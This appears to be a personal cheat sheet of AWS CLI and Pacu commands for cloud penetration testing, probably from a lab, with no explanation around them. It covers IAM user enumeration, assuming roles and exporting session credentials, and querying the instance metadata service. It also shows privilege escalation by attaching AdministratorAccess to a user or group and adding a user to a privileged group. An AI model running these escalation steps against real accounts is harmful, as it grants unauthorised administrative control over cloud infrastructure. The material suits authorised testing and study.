## Create IAM role
`aws iam create-role --role-name a4 --assume-role-policy-document file://assume-role-doc.json`  

## Enumerate users (pacu)
`run iam__enum_users --role-name a4 --account-id <account ID from $aws__enum_account> --word-list /home/kali/names.txt`  

## Assume Role
`aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging`  
### Export secrets
```
export AWS_ACCESS_KEY_ID=<>
export AWS_SECRET_ACCESS_KEY=<>
export AWS_SESSION_TOKEN=<>
//unset
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```  
### Confirm assumed role  
`aws sts get-caller-identity`  
### Retrieve attached policies for assumed role  
`aws iam list-attached-role-policies --role-name ad-LoggingRole`  
### From here we can list buckets and their objects with readonlyaccess  

## List policies attached to user  
`aws iam list-attached-user-policies --user-name <user>`  
### Check policy details for the a policy  
`aws iam get-policy --policy-arn arn:aws:iam::aws:policy/<policy>`  
### View policy details for versions  
`aws iam get-policy-version --policy-arn arn:aws:iam::225489834925:policy/Service --version-id v1` 

## List inline policies attached to users  
`aws iam list-user-policies --user-name student`  
### Enum inline policies
`aws iam get-user-policy --user-name student --policy-name <inline policy>`  
`aws iam list-role-policies --role-name Adder`  
`aws iam get-role-policy --role-name Adder --policy-name AddUser`  

## Get Region  
`curl http://169.254.169.254/latest/dynamic/instance-identity/document`  
`aws configure get region`  
`curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone | sed 's/\(.*\)[a-z]/\1/'`  
 
## Abuse `iam:AttachUserPolicy` being present  
`aws iam list-policies | grep 'AdministratorAccess'`  
`aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`  
`aws iam list-attached-user-policies --user-name student`  
`aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`  
`aws iam list-attached-group-policies --group-name Printers`  

## Abuse `iam:AddUserToGroup` being present
`aws iam add-user-to-group --group-name Printers --user-name student`  
`aws iam list-groups-for-user --user-name student`  
